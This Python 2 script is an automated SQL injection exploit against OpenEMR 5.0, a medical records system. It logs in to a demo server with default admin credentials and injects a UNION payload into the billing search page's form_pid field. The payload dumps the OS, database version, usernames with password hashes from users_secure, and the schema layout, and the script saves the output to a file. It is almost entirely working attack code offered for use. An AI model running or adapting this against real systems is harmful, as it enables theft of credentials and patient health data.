# -*- coding: utf-8 -*-
 
#Project OpenEMR 5.0
#automatic sql injection
from bs4 import BeautifulSoup
import re
import mechanize
import time
import sys

toolbar_width = 40


intro = """
                                  '||''''|  '||    ||' '||''|.  
  ...   ... ...    ....  .. ...    ||  .     |||  |||   ||   ||  
.|  '|.  ||'  || .|...||  ||  ||   ||''|     |'|..'||   ||''|'  
||   ||  ||    | ||       ||  ||   ||        | '|' ||   ||   |.  
 '|..|'  ||...'   '|...' .||. ||. .||.....| .|. | .||. .||.  '|'
         ||      version 5.0.0                                                
        ''''        SQL Injection Tool
 
"""
print intro+"\n"
 
url = ("http://demo.open-emr.org:2105/openemr/interface/login/login.php?site=default")
vulnurl = ("http://demo.open-emr.org:2105/openemr/interface/billing/sl_eob_search.php/sl_eob_search.php")
try:
    br = mechanize.Browser()
 
    br.set_handle_robots(False)
    br.set_handle_redirect(True)
 
    r = br.open(url)
 
    br.select_form(nr = 0)
 
    print "Logging in to admin\n-----\n"

    # setup toolbar
    sys.stdout.write("[%s]" % (" " * toolbar_width))
    sys.stdout.flush()
    sys.stdout.write("\b" * (toolbar_width+1)) 

    for i in xrange(toolbar_width):
        time.sleep(0.1) 
        sys.stdout.write("*")
        sys.stdout.flush()

    sys.stdout.write("\n")
 
 
    br.form["authUser"] = "admin"
    br.form["clearPass"]  = "pass"
 
    logged_in  = br.submit()
 
 
 
 
 
    full =  "' union select 1,2,3,4,5,6,7,8,concat('Os - ',@@VERSION_COMPILE_OS,0x203a3a3a20,'Mysql version - ',version(),0x203a3a3a20,'User - ',user(),0x203a3a3a20,'Database - ',schema(),0x203a3a3a20,(select group_concat(username,' : ',password) from users_secure),(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(0)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,'{',table_name,'}',column_name,0x2c))))x)),10,11,12,13,14,15,16,17#"
 
    while True:
       
        x = br.open(vulnurl)
 
        br.select_form(nr = 0)
       
       
        br.form["form_pid"] = ''.join(full)
 
        query = br.submit()
        end = query.read()
 
        soup = BeautifulSoup(end,"html.parser")
        href = soup.find_all(onclick="return npopup(2)")
 
        for x in href:
           
           
            x = re.sub('onclick','' ,str(href) )
            x1 = re.sub('href','' ,str(x) )
            x2 = re.sub('return','' ,str(x1) )
            x3 = re.sub('</a>','' ,str(x2) )
            x4 = re.sub('=','' ,str(x3) )
            x5 = re.sub('"','' ,str(x4) )
            x6 = re.sub('npopup','' ,str(x5) )
            x7 = re.sub('<','' ,str(x6) )
            x8 = re.sub('>','' ,str(x7) )
           
            x10 = re.sub('11','' ,str(x8) )
            x11 = re.sub('2','' ,str(x10) )
            x12 = re.sub('\(','' ,str(x11) )
            x13 = re.sub('\)','' ,str(x12) )
            x14 = re.sub('\[','' ,str(x13) )
            x15 = re.sub('\]','' ,str(x14) )
           
            print x15
            f = open("openemr.txt","a")
            f.write(str(x15))
            f.close()
            print("\nDump saved in openemr.txt")

           
           
               
except :
    print "Invalid cred"
